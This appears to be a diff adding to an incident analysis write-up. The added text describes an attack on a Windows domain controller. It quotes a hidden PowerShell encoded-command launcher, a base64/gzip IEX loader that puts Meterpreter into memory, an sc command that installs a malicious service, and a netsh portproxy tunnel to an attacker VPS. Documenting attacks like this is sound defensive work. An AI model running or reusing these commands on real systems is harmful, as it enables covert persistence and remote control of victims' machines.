@@ -129,3 +129,32 @@ To conduct this attack, the following commands were added to a Windows Registry 
 ```sh
 %COMSPEC% /b /c start /b /min powershell -nop -w hidden -enCodedcommand [base64 string]
 ```
+
+The decoded base64 string shows the following:
+
+```sh
+$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(more base64) "));IEX 
+	(New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();
+```
+
+Within the second base64 encoded string is a compiled Meterpreter binary. This script allocates memory, resolves WinAPIs and downloads the Meterpreter utility directly to RAM.
+
+After the successful generation of a script, the attackers used the SC utility to install a malicious service (that will execute the previous script) on the target host. This is done by using the following command:
+
+```sh
+sc \\DC-IP create ATITscUA binpath= “C:\Windows\system32\cmd.exe /b /c start /b /min powershell.exe -nop -w hidden e aQBmACgAWwBJAG4AdABQAHQA...” start= manual
+```
+
+The next step after installing the malicious service is to set up tunnels to access to the infected machine from a remote host, using the following command:
+
+```sh
+netsh interface portproxy add v4tov4 listenport=4444 connectaddress=Attacker-VPSS connectport=4443 listenaddress=0.0.0.0
+```
+
+Running this command would result in all network traffic from DC-IP:4444 being forwarded to Attacker-VPS:4443. This technique of setting up proxy tunnels will provide the attackers with the ability to control any PowerShell infected host from remote Internet hosts.
+
+Looking at the attacking host IP on Shodan shows that it is a Kali Linux server based in Romania. Kali Linux is a well-known penetration testing operating system designed by OffSec and is freely available for download or deployment by many cloud hosting platforms. 
+
+<figure>
+	<a href="/assets/images/VPS.png"><img src="/assets/images/VPS.png"></a>
+</figure>
